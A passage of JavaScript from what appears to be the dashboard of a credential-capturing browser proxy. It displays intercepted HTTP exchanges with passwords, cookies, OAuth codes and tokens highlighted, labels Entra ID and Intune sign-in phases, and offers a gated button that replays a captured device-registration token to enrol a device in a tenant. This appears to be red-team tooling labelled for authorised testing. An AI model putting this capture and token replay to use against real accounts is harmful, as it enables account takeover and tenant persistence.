  flowSelectedSid=sel.value;
  // Promote whatever we landed on into the pinned slot so other
  // tabs see the same default the next time they render.
  if(flowSelectedSid)pinnedSid=flowSelectedSid;
  if(!flowBySession[flowSelectedSid])send({cmd:'get_flow',session_id:flowSelectedSid});
  renderFlow();
}
function renderFlow(){
  const sel=document.getElementById('flow-sid-select');
  flowSelectedSid=sel.value;
  const entries=flowBySession[flowSelectedSid]||[];

  // Optional text search — filters the visible rows only (selection + dots
  // still apply to the full underlying flow).
  const q=(document.getElementById('flow-search')?.value||'').toLowerCase();
  let visible=q?entries.filter(e=>flowEntryMatchesQuery(e,q)):entries;

  // Optional "only flagged ±3" — restrict to rows within ±3 seq of ANY
  // flagged seq. Narrower, more useful windows when flagged rows are far
  // apart (vs. a single [first-3, last+3] window that pulls in everything
  // between unrelated clusters).
  const onlyFlagged=document.getElementById('flow-only-flagged')?.checked;
  if(onlyFlagged && idxActiveSeqs.size){
    const flagged=[...idxActiveSeqs].map(Number);
    visible=visible.filter(e=>{
      const n=Number(e.seq);
      for(const fs of flagged){if(Math.abs(n-fs)<=3)return true}
      return false;
    });
  }

  document.getElementById('flow-count').textContent=
    q||onlyFlagged?`${visible.length} / ${entries.length} exchange${entries.length===1?'':'s'}`
                  :`${entries.length} exchange${entries.length===1?'':'s'}`;
  const tl=document.getElementById('flow-timeline');
  // Helpful empty-state when the timeline is blank — common case
  // post-1.6.0 because Flow Trace is opt-in. Differentiate three
  // reasons so the operator knows what to do:
  //   (a) Trace is off for this session AND globally → show
  //       enable-options (URL param + global toggle).
  //   (b) Trace IS on but no events have arrived yet → show
  //       "waiting".
  //   (c) Trace on, events arrived, but search/filter excluded
  //       everything → show search-cleared hint.
  if(!entries.length){
    const sess=knownSessions[flowSelectedSid]||{};
    const sessionTrace=!!sess.trace;
    const globalTrace=!!configCache.flow_trace_enabled;
    const traceOn=sessionTrace||globalTrace;
    const loginUrl=sess.login_url||'';
    const traceUrl=loginUrl
      ? `${location.protocol}//${location.hostname}:8091/?url=${encodeURIComponent(loginUrl)}&trace=true`
      : `${location.protocol}//${location.hostname}:8091/?trace=true`;
    let body='';
    if(!flowSelectedSid){
      body=`<h3 style="color:#7dd3fc;margin:0 0 8px 0">No active session</h3>
        <p style="color:#94a3b8;font-size:13px;margin:0">Start a browser session at <code>:8091</code> first — it will appear in the dropdown above.</p>`;
    } else if(!traceOn){
      body=`<h3 style="color:#fbbf24;margin:0 0 8px 0">Flow Trace is OFF for this session</h3>
        <p style="color:#94a3b8;font-size:13px;margin:0 0 12px 0">Per-request capture is opt-in (default off since v1.6.0) — sessions run lighter without it. The credential capture path that feeds the keep-alive monitor still runs unconditionally; Flow Trace just doesn't populate.</p>
        <div style="background:#0a1525;border:1px solid #1e3a5f;border-radius:4px;padding:10px 14px;margin-bottom:8px">
          <div style="color:#7dd3fc;font-weight:600;font-size:13px;margin-bottom:4px">Enable for one new session</div>
          <p style="color:#94a3b8;font-size:12px;margin:0 0 6px 0">Open the URL below — adds <code>?trace=true</code> to the operator browser. Existing sessions keep their old setting.</p>
          <a href="${esc(traceUrl)}" target="_blank" style="color:#7dd3fc;font-family:monospace;font-size:12px;word-break:break-all">${esc(traceUrl)}</a>
        </div>
        <div style="background:#0a1525;border:1px solid #1e3a5f;border-radius:4px;padding:10px 14px">
          <div style="color:#7dd3fc;font-weight:600;font-size:13px;margin-bottom:4px">Or enable globally for every new session</div>
          <p style="color:#94a3b8;font-size:12px;margin:0 0 6px 0">Settings → Configuration → toggle <code>flow_trace_enabled</code> on. Doesn't affect already-running sessions.</p>
          <button class="btn" style="padding:3px 10px;font-size:13px" onclick="cfgSet('flow_trace_enabled',true);saveConfig()">Enable now</button>
        </div>`;
    } else {
      body=`<h3 style="color:#7dd3fc;margin:0 0 8px 0">Trace is on — waiting for events</h3>
        <p style="color:#94a3b8;font-size:13px;margin:0">Once the page makes a request the row appears here. Try interacting with the browser at <code>:8091</code>.</p>`;
    }
    if(q||onlyFlagged){
      body+=`<div style="margin-top:14px;padding:8px 12px;background:#1e1b00;color:#fef08a;border-left:3px solid #fbbf24;border-radius:0 3px 3px 0;font-size:12px">
        ${entries.length} entr${entries.length===1?'y':'ies'} captured but the active filter (${q?'search':'flagged ±3'}) excluded them.
        <button class="btn" style="margin-left:6px;padding:1px 8px;font-size:11px" onclick="document.getElementById('flow-search').value='';if(document.getElementById('flow-only-flagged'))document.getElementById('flow-only-flagged').checked=false;renderFlow()">Clear filter</button>
      </div>`;
    }
    tl.innerHTML=`<div style="padding:24px 32px">${body}</div>`;
    return;
  }
  // Render with phase-change banners: when a row's primary milestone
  // differs from the previous row's, prepend a banner so the operator
  // can see the auth flow narrative (LOGIN → AUTH CODE → TOKENS →
  // SESSION → BEARER → …) at a glance instead of hunting for pills.
  let _prevPhase=null;
  const _parts=[];
  for(const e of visible){
    const phase=_primaryPhase(e);
    if(phase && phase!==_prevPhase){
      _parts.push(_phaseBannerHtml(phase));
      _prevPhase=phase;
    } else if(!phase) {
      // Don't reset _prevPhase on untagged rows — the next tagged row
      // only banners when its phase is genuinely new vs the last
      // tagged one.
    }
    _parts.push(flowRowHtml(e));
  }
  tl.innerHTML=_parts.join('');
  // Keep the detail pane populated: use the explicit selection when set,
  // otherwise default to the first visible row so users always see data
  // (and any in-flight / cached analysis) without having to click.
  if(flowSelectedSeq!=null){
    const selE=entries.find(e=>e.seq===flowSelectedSeq);
    if(selE)renderFlowDetail(selE);
  } else if(visible.length){
    flowSelectedSeq=visible[0].seq;
    renderFlowDetail(visible[0]);
  } else if(_analysisInProgress[flowSelectedSid]||_lastAnalysis[flowSelectedSid]){
    // No transactions captured yet, but we have analysis state to show —
    // paint it directly into the detail pane so the user isn't staring at
    // the default "Select a row on the left" placeholder.
    const detailEl=document.getElementById('flow-detail');
    if(detailEl)detailEl.innerHTML='<div id="flow-ai"></div>';
    _paintAnalysis(flowSelectedSid);
  }
  renderTaintChips();
  renderMarkerInfo();
  renderFlowSelectionInfo();
}

function flowEntryMatchesQuery(e,q){
  if(!q)return true;
  const bag=(e.url||'')+' '+(e.method||'')+' '+String(e.status||'')+' '
    +JSON.stringify(e.request_headers||{})+' '+(e.request_body||'')+' '
    +JSON.stringify(e.response_headers||{})+' '+(e.response_body||'');
  return bag.toLowerCase().includes(q);
}

// Phase order — when a tagged row's primary phase differs from the
// previous tagged row's, prepend a banner. Order chosen to follow a
// canonical OAuth/OIDC narrative; a row with multiple tags banners
// against its earliest (most-narrative-significant) phase.
const _PHASE_ORDER=['ca_blocked','ca_reprocess','rp_reject','mdm_enroll','mdm_checkin','mdm_discover','login','code','tokens','refresh','prt','session','bearer'];
const _PHASE_LABELS={
  ca_blocked:   'CA-BLOCKED — Conditional Access policy blocked the sign-in',
  ca_reprocess: 'CA-REPROCESS — AAD claim challenge (re-evaluating policy)',
  rp_reject:    'RP-REJECT — relying party rejected the AAD-issued token',
  mdm_discover: 'MDM-DISCOVER — Intune enrollment discovery request',
  mdm_enroll:   'MDM-ENROLL — Intune enrollment exchange (cert + policy provisioning)',
  mdm_checkin:  'MDM-CHECKIN — Intune SyncML / OMA-DM check-in (posture report)',
  login:    'LOGIN — username/password/MFA/KMSI/consent',
  code:     'AUTH CODE — IdP redirect-back to relying party with ?code=…',
  tokens:   'TOKENS — access_token / id_token / refresh_token issued',
  refresh:  'REFRESH — token rotation (grant_type=refresh_token)',
  prt:      'PRT — Primary Refresh Token issued (AAD device-bound)',
  session:  'SESSION — browser session cookies set (ESTSAUTH*, MSPAuth, etc.)',
  bearer:   'BEARER — token-in-use (request carries Authorization: Bearer …)',
};
function _primaryPhase(e){
  const tags=e.auth_milestones||[];
  if(!tags.length)return null;
  // Pick the earliest-phase tag in canonical order, so a row that
  // happens to also carry BEARER but kicks off LOGIN banners on LOGIN.
  for(const k of _PHASE_ORDER){
    if(tags.some(t=>t.kind===k))return k;
  }
  return tags[0].kind;
}
function _phaseBannerHtml(kind){
  const label=_PHASE_LABELS[kind]||kind.toUpperCase();
  return `<div class="flow-phase-banner ${esc(kind)}">${esc(label)}</div>`;
}
function flowRowHtml(e){
  const status=e.status,sc=status==null?'pending':`s${String(status)[0]}`;
  const dur=(e.ts_resp&&e.ts_req)?`${Math.round((e.ts_resp-e.ts_req)*1000)}ms`:'';
  const shortUrl=(e.url||'').replace(/^https?:\/\//,'');
  const hit=flowRowMatchesTaint(e)?' taint-hit':'';
  const selected=e.seq===flowSelectedSeq?' selected':'';
  const picks=_flowPicks();
  const picked=picks.has(e.seq)?' picked':'';
  const m=flowMarkers[flowSelectedSid]||{};
  let markClass='',badge='';
  if(m.start!=null&&e.seq===m.start){markClass+=' mark-start';badge+='<span class="flow-marker-badge start">START</span>'}
  if(m.end!=null&&e.seq===m.end){markClass+=' mark-end';badge+='<span class="flow-marker-badge end">END</span>'}
  if(m.start!=null&&m.end!=null&&e.seq>m.start&&e.seq<m.end)markClass+=' in-range';
  // Error surfacing: any 4xx/5xx OR a body-level error flagged by
  // response_errors rules gets a red rail + an inline badge so the failing
  // transaction is unmistakable in the list, not just in the banner.
  const httpErr=typeof status==='number'&&status>=400&&status<600;
  const fe=e.flag_error;
  const isErr=httpErr||!!fe;
  const errClass=isErr?' flow-err':'';
  if(isErr){
    const label=fe?esc(fe.code||'error'):('HTTP '+status);
    const tip=fe?esc([fe.code,fe.meaning,fe.message].filter(Boolean).join(' — ')):('HTTP '+status);
    badge+=`<span class="flow-err-badge" title="${tip}">${label}</span>`;
  }
  // Auth-milestone banner pills — server-classified in
  // routes/browser.py:_on_flow_response. See backend/auth_milestones.py
  // for the kind set.
  for(const t of (e.auth_milestones||[])){
    const kind=esc(String(t.kind||'').toLowerCase());
    const label=esc(t.label||t.kind||'');
    const tip=esc(t.detail||t.label||'');
    badge+=`<span class="flow-ms-badge ${kind}" title="${tip}">${label}</span>`;
  }
  // DRS-replay flag: when this row carries a Bearer token whose `aud`
  // claim matches the AAD Device Registration Service resource ID,
  // surface a one-click ⚡ button. Operator confirms before anything
  // hits the IdP. See backend/drs_register.py.
  const drsToken=_drsTokenFromEntry(e);
  if(drsToken){
    badge+=`<button class="flow-drs-btn" onclick="event.stopPropagation();openDrsReplayModal(${e.seq})" title="Captured DRS bearer token detected — replay device registration against AAD">⚡ Register</button>`;
  }
  const dot=idxActiveSeqs.has(e.seq)?'<span class="flow-dot" title="Matches currently-selected Index item"></span>':'';
  const cb=`<input type="checkbox" class="flow-pick" onclick="event.stopPropagation();flowTogglePick(${e.seq},this.checked)" ${picks.has(e.seq)?'checked':''}>`;
  return `<div class="flow-row${selected}${hit}${markClass}${picked}${errClass}" onclick="selectFlow(${e.seq})">
    ${cb}
    <span class="flow-seq">${dot}#${e.seq}</span>
    <span class="flow-method ${e.method}">${e.method||''}</span>
    <span class="flow-status ${sc}">${status==null?'…':status}</span>
    <span class="flow-url">${esc(shortUrl)}${badge}</span>
    <span class="flow-dur">${dur}</span>
  </div>`;
}

function flowTogglePick(seq,on){
  const picks=_flowPicks();
  if(on)picks.add(seq); else picks.delete(seq);
  renderFlowSelectionInfo();
}
function flowSelectAllVisible(){
  const entries=flowBySession[flowSelectedSid]||[];
  const q=(document.getElementById('flow-search')?.value||'').toLowerCase();
  const visible=q?entries.filter(e=>flowEntryMatchesQuery(e,q)):entries;
  const picks=_flowPicks();
  for(const e of visible)picks.add(e.seq);
  renderFlow();
}
function flowClearSelection(){
  if(flowSelectedSid)flowSelectedSeqs[flowSelectedSid]=new Set();
  renderFlow();
}
function renderFlowSelectionInfo(){
  const el=document.getElementById('flow-sel-info');if(!el)return;
  const n=_flowPicks().size;
  const flagged=idxActiveSeqs.size?` · ${idxActiveSeqs.size} flagged`:'';
  el.textContent=n?`${n} selected${flagged}`:(flagged?flagged.replace(/^\s*·\s*/,''):'');
}
function _flowFlaggedSeqsInOrder(){
  const entries=flowBySession[flowSelectedSid]||[];
  return entries.filter(e=>idxActiveSeqs.has(e.seq)).map(e=>e.seq);
}
function flowNextFlagged(){
  const seqs=_flowFlaggedSeqsInOrder();
  if(!seqs.length){alert('No flagged transactions — select an item on the Index tab first');return}
  const cur=flowSelectedSeq;
  const next=seqs.find(s=>s>cur);
  const target=next!=null?next:seqs[0];
  flowSelectedSeq=target;
  _flowScrollTo(target);
}
function flowPrevFlagged(){
  const seqs=_flowFlaggedSeqsInOrder();
  if(!seqs.length){alert('No flagged transactions — select an item on the Index tab first');return}
  const cur=flowSelectedSeq;
  const rev=seqs.slice().reverse();
  const prev=rev.find(s=>s<cur);
  const target=prev!=null?prev:seqs[seqs.length-1];
  flowSelectedSeq=target;
  _flowScrollTo(target);
}
function _flowScrollTo(seq){
  const entries=flowBySession[flowSelectedSid]||[];
  const e=entries.find(x=>x.seq===seq); if(e)renderFlowDetail(e);
  renderFlow();
  setTimeout(()=>{
    // Find the DOM row with matching seq badge text and scroll it into view.
    const rows=document.querySelectorAll('.flow-row');
    for(const r of rows){
      const label=r.querySelector('.flow-seq');
      if(label && label.textContent.replace(/\\s+/g,'').includes('#'+seq)){
        r.scrollIntoView({block:'center'}); break;
      }
    }
  },30);
}

// Highlight the active Flow Trace search query within already-escaped HTML,
// without trashing our existing cap-* markup. Safe: we operate on the plain-
// text span content via a TreeWalker-free DOM round-trip.
function flowSearchHighlight(html){
  const q=(document.getElementById('flow-search')?.value||'').trim();
  if(!q)return html;
  const escQ=q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
  const re=new RegExp(escQ,'gi');
  // Wrap matches in text-only portions. Parse as a DocumentFragment so the
  // existing <span class="cap-*"> / <pre> markup is preserved.
  const host=document.createElement('div');
  host.innerHTML=html;
  const walk=(node)=>{
    if(node.nodeType===3){ // text
      const parts=node.nodeValue.split(re);
      if(parts.length<2)return;
      const matches=node.nodeValue.match(re)||[];
      const frag=document.createDocumentFragment();
      parts.forEach((p,i)=>{
        if(p)frag.appendChild(document.createTextNode(p));
        if(i<parts.length-1){
          const mk=document.createElement('mark');
          mk.style.cssText='background:#fde68a;color:#0a0a14;padding:0 2px;border-radius:2px';
          mk.textContent=matches[i]||'';
          frag.appendChild(mk);
        }
      });
      node.parentNode.replaceChild(frag,node);
      return;
    }
    if(node.nodeType===1){
      // Don't descend into <mark> we already added
      if(node.tagName==='MARK' && node.dataset.flowHighlight)return;
      for(const c of [...node.childNodes])walk(c);
    }
  };
  for(const c of [...host.childNodes])walk(c);
  return host.innerHTML;
}
function renderMarkerInfo(){
  const m=flowMarkers[flowSelectedSid]||{};
  const el=document.getElementById('flow-marker-info');if(!el)return;
  if(m.start==null&&m.end==null){el.textContent='';return}
  const entries=flowBySession[flowSelectedSid]||[];
  let n=0;
  if(m.start!=null&&m.end!=null)n=entries.filter(e=>e.seq>=m.start&&e.seq<=m.end).length;
  else if(m.start!=null)n=entries.filter(e=>e.seq>=m.start).length;
  else if(m.end!=null)n=entries.filter(e=>e.seq<=m.end).length;
  const parts=[];
  if(m.start!=null)parts.push(`start=#${m.start}`);
  if(m.end!=null)parts.push(`end=#${m.end}`);
  parts.push(`${n} in range`);
  el.textContent=parts.join('  ·  ');
}
function markFlow(which){
  if(!flowSelectedSid){alert('Select a session first');return}
  const entries=flowBySession[flowSelectedSid]||[];
  if(!entries.length){alert('No exchanges captured yet');return}
  // Use selected row if one is chosen, else the most recent
  const sel=flowSelectedSeq!=null?flowSelectedSeq:entries[entries.length-1].seq;
  if(!flowMarkers[flowSelectedSid])flowMarkers[flowSelectedSid]={start:null,end:null};
  flowMarkers[flowSelectedSid][which]=sel;
  renderFlow();
}
function clearMarkers(){
  if(!flowSelectedSid)return;
  flowMarkers[flowSelectedSid]={start:null,end:null};
  renderFlow();
}
function selectFlow(seq){
  flowSelectedSeq=seq;
  const entries=flowBySession[flowSelectedSid]||[];
  const e=entries.find(x=>x.seq===seq);
  document.querySelectorAll('.flow-row').forEach(r=>r.classList.remove('selected'));
  if(e){renderFlowDetail(e);renderFlow();}
}
const AUTH_HEADER_NAMES=new Set(['authorization','cookie','x-csrf-token','x-xsrf-token','csrf-token','x-ms-token','x-session-token','x-auth-token','www-authenticate','proxy-authorization']);
const COOKIE_HEADER_NAMES=new Set(['set-cookie','cookie']);
function headerRowHtml(k,v){
  const low=k.toLowerCase();
  let cls='';
  if(COOKIE_HEADER_NAMES.has(low))cls='cap-cookie';
  else if(AUTH_HEADER_NAMES.has(low))cls='cap-auth';
  const val=tainted(esc(String(v)));
  return `<div class="flow-kv"><b>${esc(k)}:</b> ${cls?`<span class="${cls}">${val}</span>`:val}</div>`;
}
function headersHtml(h){
  if(!h||!Object.keys(h).length)return '<div class="flow-kv" style="color:#78859b">(none)</div>';
  return Object.entries(h).map(([k,v])=>headerRowHtml(k,v)).join('');
}
function highlightCaptures(s){
  // Apply to already-escaped text. Order: tokens > oauth params (to avoid double-wrapping).
  let out=s;
  // JSON token fields:  "access_token":"..."
  out=out.replace(/(&quot;(?:access_token|id_token|refresh_token|accessToken|idToken|refreshToken|sessionToken|session_state|client_info|jwt)&quot;\s*:\s*&quot;)([^&]+?)(&quot;)/g,
    (m,pre,val,post)=>`${pre}<span class="cap-token">${val}</span>${post}`);
  // Bare JWT-ish: eyJ...
  out=out.replace(/\b(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})\b/g,
    m=>`<span class="cap-token">${m}</span>`);
  // OAuth query/body params: state=..., code=..., nonce=..., client_id=...
  out=out.replace(/(\b(?:state|code|nonce|client_id|redirect_uri|id_token_hint|session_state|code_challenge|code_verifier)=)([^&"'\s<]+)/g,
    (m,pre,val)=>`${pre}<span class="cap-oauth">${val}</span>`);
  // Form-encoded credentials
  out=out.replace(/(\b(?:username|email|password|login|user)=)([^&"'\s<]+)/g,
    (m,pre,val)=>`${pre}<span class="cap-auth">${val}</span>`);
  return out;
}
function bodyPre(b){
  if(!b)return '<div class="flow-kv" style="color:#78859b">(no body)</div>';
  return `<pre>${highlightCaptures(tainted(esc(b)))}</pre>`;
}
function urlHtml(u){
  return highlightCaptures(tainted(esc(u||'')));
}
// Per-session stash of the most recent Ollama analysis so it survives
// row-clicks, tab switches, and flow refreshes. Cleared only by an
// explicit "dismiss" or by a new analysis overwriting it.
let _lastAnalysis = {};                          // sid -> { msg, at }
let _analysisInProgress = {};                    // sid -> { preset, startedAt, lastActivity }
let _analysisStream = {};                        // sid -> { text, preset } (live streaming buffer)
// Watchdog: if an in-flight analysis goes this long with no activity (no
// streamed chunk, no completion) it's surfaced as a timeout instead of an
// infinite spinner. Reset on every chunk, so a slow cold-load/prefill
// (well under this) never trips it — only a lost command or a real stall.
const ANALYSIS_WATCHDOG_MS = 45000;

function _paintAnalysis(sid){
  sid = sid || flowSelectedSid;
  const el = document.getElementById('flow-ai'); if(!el)return;

  // If an analysis is currently running for this session, show a live
  // spinner + preset + elapsed seconds — persists across tab switches
  // and row clicks because it's re-painted from state, not from the
  // transient DOM placeholder.
  // Live streaming buffer wins once the first token lands — show the text
  // as it generates (with a spinner) instead of a static "in progress".
  const streaming = _analysisStream[sid];
  if(streaming && streaming.text){
    el.innerHTML = `<div class="flow-ai">
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
        <h3 style="margin:0;flex:1">Analysis <span style="color:#78859b;font-weight:400;font-size:12px">(${esc(streaming.preset||'general')} · streaming…)</span></h3>
        <span style="display:inline-block;width:12px;height:12px;border:2px solid #60a5fa;border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite"></span>
      </div>
      ${esc(streaming.text)}
    </div>`;
    return;
  }

  const inflight = _analysisInProgress[sid];
  if(inflight){
    const ms = Date.now() - inflight.startedAt;
    el.innerHTML = `<div class="flow-ai">
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
        <h3 style="margin:0;flex:1">Analysis in progress <span style="color:#78859b;font-weight:400;font-size:12px">(${esc(inflight.preset||'general')})</span></h3>
        <span style="display:inline-block;width:12px;height:12px;border:2px solid #60a5fa;border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite"></span>
      </div>
      <div style="color:#78859b;font-size:11px">Asking Ollama — elapsed ${(ms/1000).toFixed(1)}s · switching tabs is safe, the result will land here.</div>
    </div>`;
    return;
  }

  const entry = _lastAnalysis[sid];
  if(!entry){el.innerHTML='';return}
  const msg = entry.msg;
  if(msg.ok){
    const presetTag = msg.preset ? ` · ${esc(msg.preset)}` : '';
    const when = new Date(entry.at).toLocaleTimeString();
    const meta = `${msg.entry_count||0} exchanges, ${(msg.prompt_bytes||0).toLocaleString()} bytes${presetTag} · run at ${when}${msg.truncated?' <span style="color:#fbbf24">(truncated — raise num_ctx or narrow markers)</span>':''}`;
    el.innerHTML = `<div class="flow-ai">
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
        <h3 style="margin:0;flex:1">Analysis (${esc(msg.model||'')})</h3>
        <button class="btn" style="padding:2px 8px;font-size:11px" onclick="_dismissAnalysis('${esc(sid||'').replace(/'/g,"&#39;")}')" title="Clear analysis from this session">dismiss</button>
      </div>
      <div style="color:#78859b;font-size:11px;margin-bottom:8px">${meta}</div>
      ${esc(msg.analysis||'')}
    </div>`;
  } else {
    el.innerHTML = `<div class="flow-ai"><h3>Analysis failed</h3>${esc(msg.error||'')}</div>`;
  }
}
function _dismissAnalysis(sid){delete _lastAnalysis[sid]; _paintAnalysis(sid)}

// Ticker: keeps the "in progress" elapsed-seconds counter moving before the
// first token lands. Analysis now streams over fetch (see analyzeFlow), which
// owns its own timeout via AbortController and cleans up on completion/error,
// so no watchdog is needed here anymore.
setInterval(()=>{
  if(currentTab==='flow' && Object.keys(_analysisInProgress).length)
    _paintAnalysis(flowSelectedSid);
}, 1000);

function renderFlowDetail(e){
  const el=document.getElementById('flow-detail');
  // Inline error banner when this transaction is a failure. Either the
  // HTTP status is 4xx/5xx or response_errors in sites.yaml flagged a
  // body-level code (e.g. CyberArk Result.ErrorCode). Shown above the
  // request/response so the analyst sees the reason immediately.
  const _fe=e.flag_error;
  const _httpErr=typeof e.status==='number'&&e.status>=400&&e.status<600;
  let errBanner='';
  if(_fe||_httpErr){
    const bits=[];
    if(_fe&&_fe.code)bits.push('<b>'+esc(_fe.code)+'</b>');
    if(_httpErr&&(!_fe||!_fe.code))bits.push('<b>HTTP '+e.status+'</b>');
    if(_fe&&_fe.meaning)bits.push(esc(_fe.meaning));
    if(_fe&&_fe.idp)bits.push('['+esc(_fe.idp)+']');
    const line1=bits.join(' · ');
    const line2=(_fe&&_fe.message)?'<div style="color:#fecaca;margin-top:2px">'+esc(_fe.message)+'</div>':'';
    errBanner=`<div style="background:#3f1111;border:1px solid #7f1d1d;color:#fca5a5;padding:6px 10px;border-radius:3px;font-size:12px;margin:4px 0 8px 0;font-family:'SF Mono',ui-monospace,monospace">
      <span style="font-size:14px">&#9888;</span> ${line1||'error'}${line2}
    </div>`;
  }
  // Build the normal HTML, then run the search highlighter on it so matches
  // of the Flow Trace search box light up in-place.
  el.innerHTML=flowSearchHighlight(`
    ${errBanner}
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
      <span class="flow-method ${e.method}">${e.method||''}</span>
      <span class="flow-status s${String(e.status||'')[0]}">${e.status==null?'pending':e.status}</span>
      <span style="flex:1;color:#cbd5e1;font-size:13px;word-break:break-all">${urlHtml(e.url)}</span>
    </div>
    <div style="color:#78859b;font-size:12px;margin-bottom:4px">seq #${e.seq} · ${e.resource_type||'?'} · ${e.ts_resp&&e.ts_req?Math.round((e.ts_resp-e.ts_req)*1000)+'ms':'—'}</div>
    <div class="cap-legend">
      <span class="cap-auth">auth header / credential</span>
      <span class="cap-cookie">cookie</span>
      <span class="cap-token">token / JWT</span>
      <span class="cap-oauth">oauth param</span>
      <span style="background:#fbbf24;color:#0a0a14;padding:0 6px;border-radius:2px">tracked (taint)</span>
    </div>
    <h3>Request headers</h3>${headersHtml(e.request_headers)}
    <h3>Request body ${e.request_body_truncated?'<span style="color:#fbbf24;font-size:11px">(truncated)</span>':''}</h3>${bodyPre(e.request_body)}
    <h3>Response headers</h3>${headersHtml(e.response_headers)}
    <h3>Response body ${e.response_body_truncated?'<span style="color:#fbbf24;font-size:11px">(truncated)</span>':''}</h3>${bodyPre(e.response_body)}
    <div style="margin-top:10px;font-size:12px;color:#78859b">Add a value in the Tracked values sidebar (or click a Detected chip) to highlight it in yellow across the whole flow.</div>
    <div id="flow-ai"></div>
  `);
  // Restore any stashed analysis for this session below the detail.
  _paintAnalysis(flowSelectedSid);
}
function tainted(s){
  if(!taintValues.length)return s;
  let out=s;
  for(const v of taintValues){
    if(!v)continue;
    const re=new RegExp(v.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'g');
    out=out.replace(re,m=>`<mark style="background:#fbbf24;color:#0a0a14;padding:0 2px;border-radius:2px">${m}</mark>`);
  }
  return out;
}
function flowRowMatchesTaint(e){
  if(!taintValues.length)return false;
  const bag=(e.url||'')+' '+JSON.stringify(e.request_headers||{})+' '+(e.request_body||'')+' '+JSON.stringify(e.response_headers||{})+' '+(e.response_body||'');
  return taintValues.some(v=>v&&bag.includes(v));
}
function renderTaintChips(){
  const el=document.getElementById('flow-taint');
  const entries=flowBySession[flowSelectedSid]||[];
  const counts=taintValues.map(v=>{
    const n=v?entries.filter(e=>flowEntryContains(e,v)).length:0;
    return {v,n};
  });
  const chips=counts.map((c,i)=>`<span class="taint-chip" title="${esc(c.v)}"><b>${c.n}</b> ${esc(c.v.length>40?c.v.slice(0,40)+'…':c.v)}<button onclick="removeTaint(${i})">×</button></span>`).join('');
  const suggestions=detectSuggestedTaints().filter(v=>!taintValues.includes(v)).slice(0,8);
  const suggHtml=suggestions.length?`<h3 style="margin-top:12px">Detected</h3>${suggestions.map(v=>`<span class="taint-chip" style="color:#94a3b8" onclick="addTaint('${v.replace(/'/g,"\\'")}')" title="Click to track">${esc(v.length>40?v.slice(0,40)+'…':v)}</span>`).join('')}`:'';
  el.innerHTML=`<h3>Tracked values</h3>${chips||'<div style="color:#78859b;font-size:12px">None yet. Add a value below or click a detected one.</div>'}
    <div class="taint-add"><input id="taint-input" placeholder="value" onkeydown="if(event.key==='Enter')addTaintFromInput()"><button class="taint-btn" onclick="addTaintFromInput()">+</button></div>
    ${suggHtml}`;
}
function flowEntryContains(e,v){
  if(!v)return false;
  const bag=(e.url||'')+' '+JSON.stringify(e.request_headers||{})+' '+(e.request_body||'')+' '+JSON.stringify(e.response_headers||{})+' '+(e.response_body||'');
  return bag.includes(v);
}
function addTaintFromInput(){const el=document.getElementById('taint-input');if(el&&el.value){addTaint(el.value);el.value=''}}
function addTaint(v){if(!v||taintValues.includes(v))return;taintValues.push(v);renderFlow()}
function removeTaint(i){taintValues.splice(i,1);renderFlow()}
function removeTaintValue(v){
  if(!v)return;
  const i=taintValues.indexOf(v);
  if(i>=0){taintValues.splice(i,1);renderFlow()}
}
function detectSuggestedTaints(){
  const entries=flowBySession[flowSelectedSid]||[];
  const seen={};
  for(const e of entries){
    const u=e.url||'';
    const q=u.split('?')[1];
    if(q){for(const pair of q.split('&')){const p=pair.split('=');if(p.length===2&&p[1].length>=6&&p[1].length<=200){const key=decodeURIComponent(p[0]);const val=decodeURIComponent(p[1]);if(['state','code','nonce','session_state','client_id','redirect_uri','id_token'].includes(key))seen[val]=(seen[val]||0)+1}}}
    for(const k of Object.keys(e.response_headers||{})){if(k.toLowerCase()==='set-cookie'){const sc=e.response_headers[k]||'';const name=sc.split('=',1)[0];if(name&&name.length<40)seen[name]=(seen[name]||0)+1}}
  }
  return Object.entries(seen).filter(([,n])=>n>=1).sort((a,b)=>b[1]-a[1]).map(([v])=>v);
}
function clearFlow(){send({cmd:'clear_flow',session_id:flowSelectedSid});flowBySession[flowSelectedSid]=[];renderFlow()}
function clearRagFindings(){
  if(!confirm('Clear ALL findings imported into the built-in RAG engine (everything sent via "Send to RAG")?\n\nCaptured flow traces are NOT deleted — they still auto-surface in RAG.'))return;
  if(!send({cmd:'clear_rag_findings'}))alert('Dashboard is not connected (WebSocket down). Reload and try again.');
}
function reclassifyFlow(){
  if(!flowSelectedSid){alert('Pick a session first');return}
  send({cmd:'reclassify_flow',session_id:flowSelectedSid});
}

// ── DRS device-registration replay (Flow Trace ⚡ button) ──
// Two-step gate: (1) `allow_drs_replay` config must be true server-side,
// (2) the operator must click Confirm in this modal. Without both, the
// POST to /api/devices/drs-register-from-token is rejected. The modal
// shows the decoded token's `tid` / `upn` / `oid` / `scp` / `exp` so
// the operator can see exactly which tenant + identity they're about
// to register against.
function _closeDrsModal(){
  const el=document.getElementById('drs-modal-host');
  if(el)el.remove();
}
async function openDrsReplayModal(seq){
  const e=(flowBySession[flowSelectedSid]||[]).find(x=>x.seq===seq);
  if(!e){alert('Flow row not found for #'+seq);return}
  const token=_drsTokenFromEntry(e);
  if(!token){alert('No DRS-bearer token found on row #'+seq);return}
  // Server-side analyze gives us the same data the JS decoder would
  // plus the `valid_for_drs` flag computed authoritatively.
  let info=null;
  try{
    const r=await apiFetch('/api/devices/drs-analyze-token',{
      method:'POST', body:JSON.stringify({token})
    });
    info=await r.json();
  }catch(err){
    alert('Token analyze failed: '+err);return;
  }
  const allowOn=!!configCache.allow_drs_replay;
  const expClass=info.expired?'color:#fca5a5':'color:#86efac';
  const expText=info.expired
    ? `EXPIRED ${Math.abs(info.expires_in_secs||0)}s ago`
    : `expires in ${info.expires_in_secs||0}s`;
  const host=document.createElement('div');
  host.id='drs-modal-host';
  host.className='drs-modal-bg';
  host.innerHTML=`<div class="drs-modal">
    <h3>⚡ Replay device registration against AAD</h3>
    <div class="danger">
      <b>This will mutate state on the IdP tenant.</b>
      A new device record is created in Entra ID under the user identified
      by this token. Authorized testing only.
    </div>
    <table>
